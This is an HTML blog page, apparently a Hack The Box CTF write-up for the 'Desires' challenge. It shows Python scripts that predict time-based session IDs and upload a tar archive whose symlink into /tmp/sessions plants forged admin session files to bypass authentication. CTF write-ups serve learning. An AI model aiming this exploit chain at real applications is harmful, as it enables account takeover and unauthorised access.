@@ -1,0 +1,1154 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<title>HTB DESIRES WRITEUP | SYC</title>
+
+<meta
+    name="description"
+    content="Challenge Scenario As survivors face the vault, anticipation thickens the air, igniting desires for power and glory. Subtle glances reveal hidden ambitions. Unbeknownst t..."
+>
+
+<meta
+    name="robots"
+    content="index, follow"
+>
+
+<link
+    rel="canonical"
+    href="https://syc-sigma.vercel.app/p/HTB%20Desires%20Writeup"
+>
+
+<meta
+    property="og:title"
+    content="HTB DESIRES WRITEUP | SYC"
+>
+
+<meta
+    property="og:description"
+    content="Challenge Scenario As survivors face the vault, anticipation thickens the air, igniting desires for power and glory. Subtle glances reveal hidden ambitions. Unbeknownst t..."
+>
+
+<meta
+    property="og:type"
+    content="article"
+>
+
+<meta
+    property="og:url"
+    content="https://syc-sigma.vercel.app/p/HTB%20Desires%20Writeup"
+>
+
+<meta
+    property="og:site_name"
+    content="SYC"
+>
+
+<meta
+    name="twitter:card"
+    content="summary"
+>
+
+<meta
+    name="twitter:title"
+    content="HTB DESIRES WRITEUP | SYC"
+>
+
+<meta
+    name="twitter:description"
+    content="Challenge Scenario As survivors face the vault, anticipation thickens the air, igniting desires for power and glory. Subtle glances reveal hidden ambitions. Unbeknownst t..."
+>
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link
+    rel="shortcut icon"
+    href="/favicon.ico"
+    type="image/x-icon"
+>
+
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=Fira+Code&display=swap"
+    rel="stylesheet"
+>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+    id="hljs-style"
+>
+
+<script
+    src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+    defer
+></script>
+
+
+<style>
+
+:root[data-theme="dark"] {
+    --bg-1: #050505;
+    --bg-2: #0a0c1a;
+    --bg-3: #120d1a;
+    --text-main: #ffffff;
+    --text-dim: rgba(255, 255, 255, 0.5);
+    --accent: #ffffff;
+    --canvas-opacity: 0.9;
+    --code-bg: rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+    --bg-1: #fdfdfd;
+    --bg-2: #f0f4ff;
+    --bg-3: #f9f0ff;
+    --text-main: #000000;
+    --text-dim: rgba(0, 0, 0, 0.5);
+    --accent: #000000;
+    --canvas-opacity: 0.5;
+    --code-bg: rgba(0, 0, 0, 0.05);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    transition:
+        background-color 0.6s,
+        color 0.4s;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background:
+        linear-gradient(
+            125deg,
+            var(--bg-1),
+            var(--bg-2),
+            var(--bg-3),
+            var(--bg-1)
+        );
+
+    background-size: 400% 400%;
+
+    animation:
+        spaceFlow 25s ease infinite;
+
+    color: var(--text-main);
+
+    font-family:
+        'Inter',
+        -apple-system,
+        BlinkMacSystemFont,
+        sans-serif;
+
+    line-height: 1.8;
+
+    overflow-x: hidden;
+}
+
+@keyframes spaceFlow {
+    0% {
+        background-position: 0% 50%;
+    }
+
+    50% {
+        background-position: 100% 50%;
+    }
+
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+#article-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -1;
+
+    pointer-events: none;
+
+    opacity: var(--canvas-opacity);
+}
+
+.theme-toggle {
+    position: fixed;
+
+    bottom: 30px;
+    right: 30px;
+
+    width: 48px;
+    height: 48px;
+
+    border-radius: 50%;
+
+    background: var(--text-main);
+    color: var(--bg-1);
+
+    border: none;
+
+    cursor: pointer;
+
+    z-index: 2000;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-family: 'Fira Code';
+
+    font-size: 10px;
+
+    font-weight: bold;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.2);
+}
+
+#progress {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    height: 3px;
+
+    background: var(--accent);
+
+    width: 0%;
+
+    z-index: 2000;
+}
+
+nav {
+    padding: 25px 40px;
+
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+
+    position: sticky;
+
+    top: 0;
+
+    z-index: 1000;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+nav a {
+    color: var(--text-dim);
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-family: 'Fira Code';
+
+    letter-spacing: 1px;
+}
+
+nav a:hover {
+    color: var(--text-main);
+}
+
+.content-wrapper {
+    max-width: 900px;
+
+    margin: 40px auto;
+
+    padding: 40px 24px;
+
+    min-height: 80vh;
+}
+
+.article-header {
+    margin-bottom: 70px;
+}
+
+.article-header h1 {
+    font-size:
+        clamp(32px, 7vw, 64px);
+
+    font-weight: 700;
+
+    color: var(--text-main);
+
+    letter-spacing: -4px;
+
+    line-height: 1;
+
+    text-transform: uppercase;
+}
+
+.article-meta {
+    margin-top: 20px;
+
+    color: var(--text-dim);
+
+    font-family: 'Fira Code';
+
+    font-size: 11px;
+
+    letter-spacing: 1px;
+}
+
+.markdown-body {
+    overflow-wrap: break-word;
+}
+
+.markdown-body img {
+    max-width: 100%;
+
+    height: auto;
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    display: block;
+
+    box-shadow:
+        0 20px 50px rgba(0,0,0,0.1);
+}
+
+.markdown-body h1 {
+    font-size: 38px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+}
+
+.markdown-body h2 {
+    font-size: 28px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+
+    border-bottom:
+        1px solid var(--text-dim);
+
+    padding-bottom: 8px;
+}
+
+.markdown-body h3 {
+    font-size: 22px;
+
+    margin: 40px 0 15px;
+
+    color: var(--text-main);
+}
+
+.markdown-body p {
+    margin-bottom: 25px;
+
+    font-size: 17px;
+
+    opacity: 0.85;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+    margin: 20px 0 25px;
+
+    padding-left: 30px;
+}
+
+.markdown-body li {
+    margin-bottom: 8px;
+}
+
+.markdown-body a {
+    color: var(--text-main);
+
+    text-decoration:
+        underline;
+
+    text-underline-offset: 4px;
+}
+
+.markdown-body blockquote {
+    margin: 25px 0;
+
+    padding: 15px 20px;
+
+    border-left:
+        3px solid var(--text-main);
+
+    color: var(--text-dim);
+}
+
+.markdown-body pre {
+    background:
+        var(--code-bg) !important;
+
+    padding: 25px;
+
+    border:
+        1px solid var(--text-dim);
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+
+    backdrop-filter: blur(10px);
+}
+
+.markdown-body code {
+    font-family: 'Fira Code';
+
+    font-size: 14px;
+
+    background:
+        rgba(128,128,128,0.1);
+
+    padding: 3px 6px;
+
+    border-radius: 4px;
+}
+
+.markdown-body pre code {
+    background: transparent;
+
+    padding: 0;
+}
+
+.markdown-body table {
+    width: 100%;
+
+    border-collapse: collapse;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+}
+
+.markdown-body th,
+.markdown-body td {
+    border:
+        1px solid var(--text-dim);
+
+    padding: 10px;
+
+    text-align: left;
+}
+
+.markdown-body th {
+    color: var(--text-main);
+}
+
+@media (max-width: 768px) {
+
+    .content-wrapper {
+        padding: 20px;
+    }
+
+    nav {
+        padding: 15px 20px;
+    }
+
+    .article-header h1 {
+        letter-spacing: -2px;
+    }
+
+    .markdown-body p {
+        font-size: 16px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="progress"></div>
+
+<canvas id="article-canvas"></canvas>
+
+
+<button
+    class="theme-toggle"
+    onclick="toggleTheme()"
+>
+    MODE
+</button>
+
+
+<nav>
+
+<a href="/">
+    &lt;- BACK_TO_TERMINAL
+</a>
+
+<span
+    id="reading-id"
+    style="
+        font-family:'Fira Code';
+        font-size:10px;
+        color:var(--text-dim);
+    "
+>
+    SYSTEM: SYNCED
+</span>
+
+</nav>
+
+
+<main class="content-wrapper">
+
+<header class="article-header">
+
+<h1>
+HTB DESIRES WRITEUP
+</h1>
+
+<div class="article-meta">
+    HTB DESIRES WRITEUP.MD
+</div>
+
+</header>
+
+
+<article class="markdown-body">
+
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*34w6W4N6CWqpvleAjC8Gbg.png" /></p>
+<h4>Challenge Scenario</h4>
+<hr />
+<p>As survivors face the vault, anticipation thickens the air, igniting desires for power and glory. Subtle glances reveal hidden ambitions. Unbeknownst to them, toxic gas twists thoughts, fueling greed and paranoia.</p>
+<p>check the flag</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*F2Sf_DUyVJSUes1eVW5ZvA.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*4ZTPLSfSDQj6UygubCVJog.png" /></p>
+<p>its a upload page,but cant upload normal type</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*u8sY6YgTg2lroAbMxvLIQA.png" /></p>
+<p>check the zip file</p>
+<p>we can found UploadEnigma </p>
+<p>it has Zip Slip</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ij_tCyPbvN2MPIomVJxsQw.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*tUtKyY-GFu7m0kwzklYmrA.png" /></p>
+<p>besides,the SessionMiddleware and GetSession</p>
+<p>we can found sessionid</p>
+<p>was set by username at /tmp/sessions</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*LmPa9FkPk2tWZ_ywznCQ5Q.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*Tulm-cTbISB97MnC2xEPwQ.png" /></p>
+<p>so， we have a idea</p>
+<p>first we need to use resgister to create a new account</p>
+<p>f12,get our session, a part our our path</p>
+<p>/tmp/session/YOUR ID</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*mNruGn2MSWHmKSEp6G0w8A.png" /></p>
+<p>so，make a json like</p>
+<blockquote>
+<p><strong>{<br />
+ “username”: “你的用户名”,<br />
+ “id”: 你的ID,<br />
+ “role”: “admin”</strong></p>
+</blockquote>
+<p>here is one more question</p>
+<p>how to handle <strong>“sessionID”</strong></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ZbdFvjRFumntjwLPLJAKiw.png" /></p>
+<p>we know sessionid only depends on time</p>
+<p>so,use</p>
+<blockquote>
+<p><strong><em>import requests as re</em></strong></p>
+<p><strong><em>import hashlib</em></strong></p>
+<p><strong><em>from datetime import datetime, timezone, timedelta</em></strong></p>
+<p><strong><em>import sys</em></strong></p>
+<p><strong><em>BASE_URL = “http://154.57.164.83:31345"</em></strong></p>
+<p><strong><em>USERNAME = “noexist”</em></strong></p>
+<p><strong><em>MONTHS = [ “Jan” , “Feb” , “Mar” , “Apr” , “May” , “Jun” , “Jul” , “Aug” , “Sep” , “Oct” , “Nov” , “Dec” ]</em></strong></p>
+<p><strong><em>def extract_posix_time_from_fake_login():</em></strong></p>
+<p><strong><em>try:</em></strong></p>
+<p><strong><em>resp = re.post(f”{BASE_URL}/login”, {“username”: USERNAME, “password”: “dummypassword”})</em></strong></p>
+<p><strong><em>date_header = resp.headers.get(“Date”)</em></strong></p>
+<p><strong><em>print(f”日期头：{date_header}”)</em></strong></p>
+<p><strong><em>if not date_header:</em></strong></p>
+<p><strong><em>print(“未找到日期头！”)</em></strong></p>
+<p><strong><em>return None</em></strong></p>
+<p><strong><em>parts = date_header.split(“,”)[1].split()</em></strong></p>
+<p><strong><em>day, mon, year, time_str, tz_str = parts</em></strong></p>
+<p><strong><em>hours, minutes, seconds = time_str.split(“:”)</em></strong></p>
+<p><strong><em>mon_idx = MONTHS.index(mon.capitalize()) + 1</em></strong></p>
+<p><strong><em>tz = timezone(offset=timedelta(hours=0))</em></strong></p>
+<p><strong><em>dt = datetime(int(year), mon_idx, int(day), int(hours), int(minutes), int(seconds), tzinfo=tz)</em></strong></p>
+<p><strong><em>posix = int(dt.timestamp())</em></strong></p>
+<p><strong><em>print(f”日期时间对象：{dt}”)</em></strong></p>
+<p><strong><em>print(f”POSIX时间：{posix}”)</em></strong></p>
+<p><strong><em>return posix</em></strong></p>
+<p><strong><em>except Exception as e:</em></strong></p>
+<p><strong><em>print(f”错误：{e}”)</em></strong></p>
+<p><strong><em>return None</em></strong></p>
+<p><strong><em>if <strong>name</strong> == “<strong>main</strong>”:</em></strong></p>
+<p><strong><em>if len(sys.argv) &gt; 1:</em></strong></p>
+<p><strong><em>BASE_URL = sys.argv[1]</em></strong></p>
+<p><strong><em>print(f”[*] Target: {BASE_URL}”)</em></strong></p>
+<p><strong><em>posix = extract_posix_time_from_fake_login()</em></strong></p>
+<p><strong><em>if posix:</em></strong></p>
+<p><strong><em>print()</em></strong></p>
+<p><strong><em>h1 = hashlib.sha256(str(posix — 1).encode()).hexdigest()</em></strong></p>
+<p><strong><em>h2 = hashlib.sha256(str(posix).encode()).hexdigest()</em></strong></p>
+<p><strong><em>h3 = hashlib.sha256(str(posix + 1).encode()).hexdigest()</em></strong></p>
+<p><strong><em>print(f”SESSION_ID_1 = \”{h1}\””)</em></strong></p>
+<p><strong><em>print(f”SESSION_ID_2 = \”{h2}\””)</em></strong></p>
+<p><strong><em>print(f”SESSION_ID_3 = \”{h3}\””)</em></strong></p>
+</blockquote>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*eD26ue0vPEpFlqyqnTHgbg.png" /></p>
+<p>than use</p>
+<blockquote>
+<p><strong><em>import requests as re</em></strong></p>
+<p><strong><em>import hashlib</em></strong></p>
+<p><strong><em>from datetime import datetime, timezone, timedelta</em></strong></p>
+<p><strong><em>import sys</em></strong></p>
+<p><strong><em>BASE_URL = “http://154.57.164.83:31345"</em></strong></p>
+<p><strong><em>USERNAME = “noexist”</em></strong></p>
+<p><strong><em>MONTHS = [ “Jan” , “Feb” , “Mar” , “Apr” , “May” , “Jun” , “Jul” , “Aug” , “Sep” , “Oct” , “Nov” , “Dec” ]</em></strong></p>
+<p><strong><em>def extract_posix_time_from_fake_login():</em></strong></p>
+<p><strong><em>try:</em></strong></p>
+<p><strong><em>resp = re.post(f”{BASE_URL}/login”, {“username”: USERNAME, “password”: “dummypassword”})</em></strong></p>
+<p><strong><em>date_header = resp.headers.get(“Date”)</em></strong></p>
+<p><strong><em>print(f”日期头：{date_header}”)</em></strong></p>
+<p><strong><em>if not date_header:</em></strong></p>
+<p><strong><em>print(“未找到日期头！”)</em></strong></p>
+<p><strong><em>return None</em></strong></p>
+<p><strong><em>parts = date_header.split(“,”)[1].split()</em></strong></p>
+<p><strong><em>day, mon, year, time_str, tz_str = parts</em></strong></p>
+<p><strong><em>hours, minutes, seconds = time_str.split(“:”)</em></strong></p>
+<p><strong><em>mon_idx = MONTHS.index(mon.capitalize()) + 1</em></strong></p>
+<p><strong><em>tz = timezone(offset=timedelta(hours=0))</em></strong></p>
+<p><strong><em>dt = datetime(int(year), mon_idx, int(day), int(hours), int(minutes), int(seconds), tzinfo=tz)</em></strong></p>
+<p><strong><em>posix = int(dt.timestamp())</em></strong></p>
+<p><strong><em>print(f”日期时间对象：{dt}”)</em></strong></p>
+<p><strong><em>print(f”POSIX时间：{posix}”)</em></strong></p>
+<p><strong><em>return posix</em></strong></p>
+<p><strong><em>except Exception as e:</em></strong></p>
+<p><strong><em>print(f”错误：{e}”)</em></strong></p>
+<p><strong><em>return None</em></strong></p>
+<p><strong><em>if <strong>name</strong> == “<strong>main</strong>”:</em></strong></p>
+<p><strong><em>if len(sys.argv) &gt; 1:</em></strong></p>
+<p><strong><em>BASE_URL = sys.argv[1]</em></strong></p>
+<p><strong><em>print(f”[*] Target: {BASE_URL}”)</em></strong></p>
+<p><strong><em>posix = extract_posix_time_from_fake_login()</em></strong></p>
+<p><strong><em>if posix:</em></strong></p>
+<p><strong><em>print()</em></strong></p>
+<p><strong><em>h1 = hashlib.sha256(str(posix — 1).encode()).hexdigest()</em></strong></p>
+<p><strong><em>h2 = hashlib.sha256(str(posix).encode()).hexdigest()</em></strong></p>
+<p><strong><em>h3 = hashlib.sha256(str(posix + 1).encode()).hexdigest()</em></strong></p>
+<p><strong><em>print(f”SESSION_ID_1 = \”{h1}\””)</em></strong></p>
+<p><strong><em>print(f”SESSION_ID_2 = \”{h2}\””)</em></strong></p>
+<p><strong><em>print(f”SESSION_ID_3 = \”{h3}\””)</em></strong></p>
+</blockquote>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*eD26ue0vPEpFlqyqnTHgbg.png" /></p>
+<p>than use</p>
+<blockquote>
+<p>**_import requests<br />
+import tarfile<br />
+import io<br />
+import json<br />
+import time<br />
+BASE_URL = “http://154.57.164.83:31345"<br />
+TARGET_SIDS = [<br />
+ “80d1c0c0eeaa4e71ef7b66b73c1db3e3a4905834b02c4bdda4df3094b2bf56d3”, <br />
+ “8cb4a6f78e32170f0b3a44187d18043c3744f193d9abfe9d165a640c65be9bed”, <br />
+ “0e285068454463b17656d7e7d3629f7cf39038380c8edff7458e59a3c5e95a12”   </p>
+<p>TARGET_USER = “noexist” <br />
+HELPER_USER = “pwn_helper_99”_** </p>
+<p><strong><em>def create_precise_tar():<br />
+ file_out = io.BytesIO()<br />
+ with tarfile.open(fileobj=file_out, mode=”w”) as tar:<br />
+ sym_link = “link_to_tmp”<br />
+ sym_info = tarfile.TarInfo(name=sym_link)<br />
+ sym_info.type = tarfile.SYMTYPE<br />
+ sym_info.linkname = “/tmp/sessions”<br />
+ tar.addfile(sym_info)</em></strong></p>
+<p>**_admin_data = json.dumps({<br />
+ “username”: TARGET_USER,<br />
+ “id”: 1337,<br />
+ “role”: “admin”,<br />
+ “Role”: “admin”,<br />
+ “Admin”: True<br />
+ }).encode()<br />
+ for sid in TARGET_SIDS:<br />
+ path = f”{sym_link}/{TARGET_USER}/{sid}”<br />
+ info = tarfile.TarInfo(name=path)<br />
+ info.size = len(admin_data)<br />
+ tar.addfile(info, io.BytesIO(admin_data))  </p>
+<p>return file_out.getvalue()_**</p>
+<p>**_def exploit():<br />
+ s = requests.Session()  </p>
+<p>print(f”[<em>] 正在准备上传助手: {HELPER_USER}”)<br />
+ s.post(f”{BASE_URL}/register”, json={“username”: HELPER_USER, “password”: “p”})<br />
+ s.post(f”{BASE_URL}/login”, data={“username”: HELPER_USER, “password”: “p”})_</em>*</p>
+<p><strong>_print(“[<em>] 正在构造并上传精准 Payload…”)<br />
+ tar_data = create_precise_tar()<br />
+ files = {‘archive’: (f’exploit_{int(time.time())}.tar’, tar_data)}<br />
+ r = s.post(f”{BASE_URL}/user/upload”, files=files)<br />
+ print(f”[</em>] 上传返回状态码: {r.status_code}”)<br />
+ print(“[*] 等待解压落盘…”)<br />
+ time.sleep(2)_</strong></p>
+<p>*<em>_print(f”[</em>] 正在尝试以 {TARGET_USER} 身份验证…”)<br />
+ for sid in TARGET_SIDS:<br />
+ cookies = {<br />
+ “username”: TARGET_USER,<br />
+ “session”: sid<br />
+ }<br />
+ resp = requests.get(f”{BASE_URL}/user/admin”, cookies=cookies, allow_redirects=False)  </p>
+<p>if “HTB{“ in resp.text:<br />
+ print(“\n” + “★” * 60)<br />
+ print(“[🎊] 成功！Flag 如下：”)<br />
+ import re<br />
+ flag = re.findall(r’HTB{.*?}’, resp.text)<br />
+ print(flag[0] if flag else resp.text.strip())<br />
+ print(“★” * 60)<br />
+ return  </p>
+<p>print(“[-] 依旧未命中。”)<br />
+if <strong>name</strong> == “<strong>main</strong>”:<br />
+exploit()_**</p>
+</blockquote>
+<p>we got it
+<img alt="f8MSbltxa0RUzhrQM9x_4A.png" src="https://cdn-images-1.medium.com/max/1000/1*f8MSbltxa0RUzhrQM9x_4A.png" />
+<strong><em>HTB{S0m3tIm3sIts_J4usT_A_B!G_M3ss}</em></strong></p>
+
+</article>
+
+</main>
+
+
+<script>
+
+/* ==========================================================
+   Theme
+   ========================================================== */
+
+function toggleTheme() {
+
+    const root =
+        document.documentElement;
+
+    const target =
+        root.getAttribute('data-theme') === 'dark'
+            ? 'light'
+            : 'dark';
+
+    root.setAttribute(
+        'data-theme',
+        target
+    );
+
+    localStorage.setItem(
+        'theme',
+        target
+    );
+
+    const style =
+        document.getElementById(
+            'hljs-style'
+        );
+
+    if (style) {
+
+        style.href =
+            target === 'dark'
+                ? "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+                : "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css";
+    }
+}
+
+
+/* ==========================================================
+   Restore Theme
+   ========================================================== */
+
+try {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            localStorage.getItem('theme') || 'dark'
+        );
+
+} catch (e) {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            'dark'
+        );
+}
+
+
+/* ==========================================================
+   Code Highlight
+   ========================================================== */
+
+window.addEventListener(
+    'load',
+    () => {
+
+        if (
+            window.hljs
+        ) {
+
+            document
+                .querySelectorAll(
+                    'pre code'
+                )
+                .forEach(
+                    (el) => {
+                        hljs.highlightElement(el);
+                    }
+                );
+        }
+
+    }
+);
+
+
+/* ==========================================================
+   Reading ID
+   ========================================================== */
+
+document
+    .getElementById('reading-id')
+    .innerText =
+        'SYSTEM: HTB DESIRES WRITEUP.MD';
+
+
+/* ==========================================================
+   Reading Progress
+   ========================================================== */
+
+window.addEventListener(
+    'scroll',
+    () => {
+
+        const winScroll =
+            document.documentElement.scrollTop;
+
+        const height =
+            document.documentElement.scrollHeight -
+            document.documentElement.clientHeight;
+
+        const percentage =
+            height > 0
+                ? (winScroll / height) * 100
+                : 0;
+
+        document
+            .getElementById('progress')
+            .style.width =
+                percentage + '%';
+
+    }
+);
+
+
+/* ==========================================================
+   Dynamic Background
+   ========================================================== */
+
+const canvas =
+    document.getElementById(
+        'article-canvas'
+    );
+
+const ctx =
+    canvas.getContext('2d');
+
+let fluidNodes = [];
+
+let trailParticles = [];
+
+const mouse = {
+    x: -500,
+    y: -500
+};
+
+
+function initCanvas() {
+
+    canvas.width =
+        window.innerWidth;
+
+    canvas.height =
+        window.innerHeight;
+
+    fluidNodes =
+        Array.from(
+            { length: 3 },
+            () => ({
+
+                x:
+                    Math.random() *
+                    canvas.width,
+
+                y:
+                    Math.random() *
+                    canvas.height,
+
+                vx:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                vy:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                size:
+                    Math.random() *
+                    (canvas.width * 0.4) +
+                    canvas.width * 0.3
+            })
+        );
+}
+
+
+window.onmousemove =
+    (e) => {
+
+        mouse.x =
+            e.clientX;
+
+        mouse.y =
+            e.clientY;
+
+        for (
+            let i = 0;
+            i < 2;
+            i++
+        ) {
+
+            trailParticles.push(
+                new Particle(
+                    mouse.x,
+                    mouse.y
+                )
+            );
+        }
+    };
+
+
+class Particle {
+
+    constructor(x, y) {
+
+        this.x = x;
+
+        this.y = y;
+
+        this.vx =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.vy =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.life = 1.0;
+
+        this.decay =
+            0.015 +
+            Math.random() * 0.02;
+
+        this.size =
+            Math.random() * 2.5 +
+            0.5;
+    }
+
+    update() {
+
+        this.x += this.vx;
+
+        this.y += this.vy;
+
+        this.life -= this.decay;
+    }
+
+    draw(color) {
+
+        ctx.fillStyle =
+            `rgba(${color}, ${this.life * 0.4})`;
+
+        ctx.beginPath();
+
+        ctx.arc(
+            this.x,
+            this.y,
+            this.size,
+            0,
+            Math.PI * 2
+        );
+
+        ctx.fill();
+    }
+}
+
+
+function draw() {
+
+    const isDark =
+        document.documentElement
+            .getAttribute(
+                'data-theme'
+            ) === 'dark';
+
+    ctx.fillStyle =
+        isDark
+            ? "rgba(5, 5, 5, 0.15)"
+            : "rgba(253, 253, 253, 0.15)";
+
+    ctx.fillRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    ctx.globalCompositeOperation =
+        isDark
+            ? "lighter"
+            : "multiply";
+
+
+    const colorRGB =
+        isDark
+            ? "60, 70, 100"
+            : "200, 210, 240";
+
+
+    fluidNodes.forEach(
+        node => {
+
+            node.x += node.vx;
+
+            node.y += node.vy;
+
+
+            if (
+                node.x < 0 ||
+                node.x > canvas.width
+            ) {
+                node.vx *= -1;
+            }
+
+
+            if (
+                node.y < 0 ||
+                node.y > canvas.height
+            ) {
+                node.vy *= -1;
+            }
+
+
+            const g =
+                ctx.createRadialGradient(
+                    node.x,
+                    node.y,
+                    0,
+                    node.x,
+                    node.y,
+                    node.size
+                );
+
+
+            g.addColorStop(
+                0,
+                `rgba(${colorRGB}, 0.3)`
+            );
+
+            g.addColorStop(
+                1,
+                "transparent"
+            );
+
+
+            ctx.fillStyle = g;
+
+            ctx.beginPath();
+
+            ctx.arc(
+                node.x,
+                node.y,
+                node.size,
+                0,
+                Math.PI * 2
+            );
+
+            ctx.fill();
+
+        }
+    );
+
+
+    ctx.globalCompositeOperation =
+        "source-over";
+
+
+    const particleRGB =
+        isDark
+            ? "255, 255, 255"
+            : "0, 0, 0";
+
+
+    trailParticles.forEach(
+        (p, i) => {
+
+            p.update();
+
+            p.draw(
+                particleRGB
+            );
+
+            if (
+                p.life <= 0
+            ) {
+                trailParticles.splice(
+                    i,
+                    1
+                );
+            }
+        }
+    );
+
+
+    requestAnimationFrame(
+        draw
+    );
+}
+
+
+window.addEventListener(
+    'resize',
+    initCanvas
+);
+
+initCanvas();
+
+draw();
+
+</script>
+
+</body>
+
+</html>
